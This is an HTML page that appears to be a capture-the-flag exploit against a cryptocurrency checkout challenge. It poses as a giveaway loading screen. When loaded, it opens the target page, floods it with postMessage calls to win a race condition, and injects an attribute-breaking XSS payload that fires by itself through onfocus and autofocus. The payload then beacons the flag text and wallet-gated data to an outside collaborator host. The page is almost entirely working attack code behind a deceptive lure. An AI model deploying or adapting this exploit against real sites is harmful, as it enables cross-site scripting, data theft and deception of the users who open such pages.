<!DOCTYPE html>
<html>
<head><title>Giveaway Processing...</title></head>
<body style="background:#050A0E;color:#00FF88;font-family:monospace;text-align:center;padding-top:20%;">
    <h1>FOLLOWING THE TRAIL...</h1>
    <p>Please wait while we verify your 1337COIN reward.</p>

    <script>
        const TARGET = 'https://challenge-0126.intigriti.io';
        const COLLAB = 'https://b4gofscv4huzfnm16g1zxfipfgl79zxo.oastify.com';

        // The Payload: 
        // 1. Breaks out of title attribute
        // 2. Uses onfocus + autofocus to trigger without interaction
        // 3. Exfiltrates the flag from the banner
        const XSS = `\" onfocus=\"fetch('${TARGET}/api/wallets').then(r=>r.json()).then(w=>{if(w.find(x=>x.currency==='1337COIN')){navigator.sendBeacon('${COLLAB}',document.getElementById('flagText').innerText)}})\" autofocus=\"`;

        // Step 1: Open the checkout page
        const win = window.open(`${TARGET}/checkout.html?currency=1337COIN&price=1`);

        // Step 2: Spam the message to beat the wallet-loading race condition
        let count = 0;
        const spammer = setInterval(() => {
            win.postMessage({
                type: 'submitTransaction',
                transaction: {
                    currency: '1337COIN',
                    amount: 0.00000001,
                    toAddress: '0xAttacker',
                    txHash: XSS // Injection happens here
                }
            }, '*');
            count++;
            if (count > 20) clearInterval(spammer);
        }, 500);

        // Step 3: Redirect the admin to MarketWatch to spring the trap
        setTimeout(() => {
            win.location.href = `${TARGET}/marketwatch.html`;
        }, 8000);
    </script>
</body>
</html>
